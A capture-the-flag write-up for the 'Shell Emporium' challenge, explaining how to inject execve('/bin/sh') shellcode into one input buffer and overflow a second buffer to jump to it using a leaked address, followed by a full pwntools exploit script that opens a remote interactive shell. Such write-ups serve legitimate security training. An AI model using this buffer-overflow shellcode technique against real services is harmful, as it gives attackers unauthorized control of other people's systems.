# Write up for Shell Emporium

## Overview

For this challenge we are doing some shellcode. We have an application that gives us two text buffers to input seashell order details.

## Solution

### Flag 1

Our goal is to give ourselves a shell to control their server (as opposed to the physical shells they're selling).
To do so, we use the two inputs they give us. In the first one we put ```/bin/sh\x00``` and our shell code assembly to 
run the syscall ```execve``` on ```/bin/sh\x00``` to give ourselves a shell. We can do this, as the program gives us the address of the first buffer,
allowing us to refence where the string /bin/sh is. In the second buffer, we do a buffer overflow
to return to the address where the shellcode assembly is. For this, we can simply send the address of the shellcode assmebly
multiple times until it overflows to it. After we get our shell, we run ```ls``` to find the file ```flag.txt```, which we can 
then read with ```cat flag.txt```. Thereby giving us the flag!

The code below implements this

```
#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.update(arch="i386", os="linux")

p = remote("REDACTED", REDACTED)
# p = process("./shell_emporium")

print(p.recvuntil(b'IGNORE: '))
addr1 = p.recvline().split(b"\n")[0]
addr1 = int(addr1, 16)
print(p.recv())
p.sendline(b"2")
print(p.recv())


shellcode = asm(
f'''
mov eax, 0xB
mov ebx, {addr1}
xor ecx, ecx
xor edx, edx
int 0x80
''')

p.send(b"/bin/sh\x00")
p.sendline(shellcode)
print(p.recv())
addr2 = p32(addr1+8)
p.sendline(20*addr2)


p.interactive()
```
